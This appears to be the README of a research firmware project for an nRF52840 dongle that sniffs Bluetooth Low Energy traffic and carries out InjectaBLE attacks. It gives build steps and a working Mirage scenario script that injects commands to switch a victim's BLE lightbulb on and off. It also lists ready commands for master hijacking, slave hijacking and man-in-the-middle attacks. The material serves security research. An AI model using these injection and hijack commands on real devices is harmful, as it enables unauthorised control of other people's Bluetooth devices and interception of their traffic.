# injectable-firmware
Custom firmware for nrf52840-dongle, allowing to easily eavesdrop Bluetooth Low Energy communications and perform multiple active attacks based on InjectaBLE strategy.

## Installing the environment
* Install the latest ARM GCC Toolchain (C++ support needed), add it to your PATH variable
* Download the latest NRF5 SDK from nordic semiconductors
* Install nrfutil and add it to your PATH variable
* Set the SDK_ROOT environment variable to match the SDK directory

## Compiling the firmware
Compiling the firmware is straightforward:
```
$ make
```

Then, you can use the send command to flash it on the dongle:
```
$ make send
```

The dongle should now be detected by your operating system:
```
$ lsusb
[...]
Bus 001 Device 039: ID 5a17:0000 Mirage Toolkit ButteRFly
[...]
```

## Injecting packets into an established connection
You can use Mirage framework to interact with the dongle and perform injection attacks. For example, let's imagine you want to inject packets into a Bluetooth Low Energy connection between a lightbulb and a smartphone. You know that the following packets allow to turn the bulb on or off:

* **Write command | handle = 0x0021 | data = 5510010d0a:** turn the bulb on
* **Write command | handle = 0x0021 | data = 5510000d0a:** turn the bulb off

You can write the following scenario, which will inject the "on" packet when the up arrow key is pressed and the "off" packet when the down arrow key is pressed:

```
from mirage.core import scenario
from mirage.libs import io,ble,utils

class injection_lightbulb(scenario.Scenario):

	def onStart(self):
		self.emitter = self.module.getEmitter(self.module["INTERFACE"])

	def onKey(self,key):
		if key == "up":
			self.emitter.send(ble.BLEWriteCommand(handle=0x0021,value=b"\x55\x10\x01\x0d\x0a"))
		elif key == "down":
			self.emitter.send(ble.BLEWriteCommand(handle=0x0021,value=b"\x55\x10\x00\x0d\x0a"))
```

1) Save this scenario as **injection_lightbulb.py** in the *scenarios* folder.
2) Run the **ble_sniff** module with the following parameters:
```
sudo ./mirage_launcher ble_sniff SNIFFING_MODE=newConnections SCENARIO=injection_lightbulb INTERFACE=butterfly0
```

3) Establish the connection between the smartphone and the lightbulb: when you are synchronized with the connection, you can simply inject the previously mentioned packets by pressing up or down arrows keys.


## Hijacking the master role (experimental)
InjectaBLE allows to perform master hijacking attacks by injecting a LL\_CONNECTION\_UPDATE\_IND packet and synchronize with the Slave when the Slave changes its connection parameters. You can perform this kind of attacks using **ble_hijack** module:
```
sudo ./mirage_launcher "ble_hijack|ble_master" ble_hijack1.INTERFACE=butterfly0 ble_hijack1.ROLE=master
```


## Hijacking the slave role (experimental)
InjectaBLE allows to perform slave hijacking attacks by injecting a LL\_TERMINATE\_IND packet and synchronize with the Master when the Slave disconnects. You can perform this kind of attacks using **ble_hijack** module:
```
sudo ./mirage_launcher "ble_hijack|ble_slave" ble_hijack1.INTERFACE=butterfly0 ble_hijack1.ROLE=slave
```


## Performing a MiTM attack (experimental)
InjectaBLE allows to perform MiTM attacks by injecting a LL\_CONNECTION\_UPDATE\_IND packet and synchronize with both legitimate devices when the Slave changes its connection parameters. You can perform this kind of attacks using **ble_mitm** module:
```
sudo ./mirage_launcher ble_mitm INTERFACE=butterfly0 MITM_STRATEGY=injection
```
